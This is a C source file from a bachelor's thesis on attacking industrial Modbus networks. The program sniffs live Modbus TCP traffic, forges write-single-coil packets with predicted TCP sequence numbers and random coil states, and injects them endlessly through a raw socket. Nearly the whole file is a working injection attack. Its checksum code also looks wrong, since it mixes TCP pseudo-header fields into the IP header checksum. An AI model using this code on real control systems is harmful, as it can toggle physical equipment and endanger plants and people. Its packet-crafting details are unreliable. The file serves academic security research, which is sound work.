// Solution for BACHELOR’S THESIS: atack generation on industrial modbus network
// File:        inject.c
// Author:      Jakub Kuzník, FIT
// Program will ... 

#include "inject.h"


int main(void){
  // Modbus TCP packet
  modbusPacket * mPacket;
  char packetRawForm[PACKET_SIZE];
  // raw sockete for sending packets
  int rawSocket;  
  pcap_t * sniffInterface = NULL;
  char error_message[PCAP_ERRBUF_SIZE];

  srand(time(NULL)); // rand nums init.

  // this function will create raw socket.
  // if there is an error it will exit() program 
  rawSocket = createRawSocket();

  // open interface for sniffing // exit program if error 
  // global variable in sniff.c
  sniffInterface = openInt(error_message, OUT_INTERFACE);

  // find packet and parse all its info
  // TODO can send every nth (slow it down)
  while (1){
    mPacket = findModbusPacket();

    // generate malicious packet (predict seq, ack nums) from existing 
    generateMaliciousPacket(mPacket);

    // prepare packet to send
    packetToCharArray(packetRawForm, mPacket);

    int packet_size = ETH_HEADER_SIZE + IP_HEADER_SIZE
    + TCP_HEADER_SIZE + MODBUS_HEADER_SIZE + ntohs(mPacket->modbusH.lenght) -1;

    //// debug packet raw data 
    for (int i = 0; i < packet_size; i++)
      printf(" %02hhX", packetRawForm[i]);
    printf("\n");

    // send the data over the raw socket
    write(rawSocket, packetRawForm, packet_size);
    printf(".");
    free(mPacket->modbusP.data);
    free(mPacket);
  }

  // close sniffing interface 
  pcap_close(sniffInterface);
  return 0;

//error3:
  //fprintf(stderr, "ERROR send() %d Sending data failed \n", ret);
  //return 2;
}

/**
 * @brief Create malicious packet from existing. 
 */
void generateMaliciousPacket(modbusPacket *mPacket){

  // ref number -> 3 
  // activate -> data -> FF  
  // ack = ack + 48 == 4 write_single_coil packets
  // seq = seq + 48 == 4 write_single_coil packets


  mPacket->ipHeader.id = random();

  mPacket->ipHeader.check = 0;

  uint32_t sum = 0;
  uint16_t *ptr = (uint16_t*)&mPacket->ipHeader;
  for (int i = 0; i < sizeof(struct iphdr)/2; i++) {
      sum += ntohs(*(ptr+i));
  }

  // Add in the pseudo-header fields
  sum += ntohs(mPacket->ipHeader.protocol);
  sum += ntohs(mPacket->ipHeader.tot_len);
  sum += ntohs(mPacket->ipHeader.saddr>>16);
  sum += ntohs(mPacket->ipHeader.saddr & 0xffff);
  sum += ntohs(mPacket->ipHeader.daddr>>16);
  sum += ntohs(mPacket->ipHeader.daddr & 0xffff);

  // Fold the carries into the sum
  while (sum >> 16) {
      sum = (sum & 0xFFFF) + (sum >> 16);
  }

  // Take the one's complement of the result and store it in the checksum field
  mPacket->ipHeader.check = htons(~sum);



  mPacket->tcpHeader.seq = htonl(ntohl(mPacket->tcpHeader.seq) + 48);
  mPacket->tcpHeader.ack_seq = htonl(ntohl(mPacket->tcpHeader.ack_seq) + 48);

  // transaction id has to be unique 
  mPacket->modbusH.transactionId += rand();

  // ref num 3
  mPacket->modbusP.data[0] = 0;
  mPacket->modbusP.data[1] = rand() % 4;

  // activate data
  if (rand() % 2 == 0)
    mPacket->modbusP.data[2] = 0xff;
  else
    mPacket->modbusP.data[2] = 0x00;
}

/**
 * @brief Set the Raw Socket object
 * @return socket or exit program  
 */
int createRawSocket(){

  int rawSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (rawSocket < 0){
    fprintf(stderr, "Error can't create raw socket\n");
    exit(1);
  }

  // get index of network interface named "eno2"
  int ifIndex = if_nametoindex(OUT_INTERFACE);
  if (ifIndex == 0) {
    fprintf(stderr, "Can't get network interface index");
    exit(1);
  }

  // bind socket to network interface
  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_family = AF_PACKET;
  sa.sll_protocol = htons(ETH_P_ALL);
  sa.sll_ifindex = ifIndex; 
  if (bind(rawSocket, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    fprintf(stderr, "Can't bind socket to interface");
    exit(1);
  }

  return rawSocket;
}
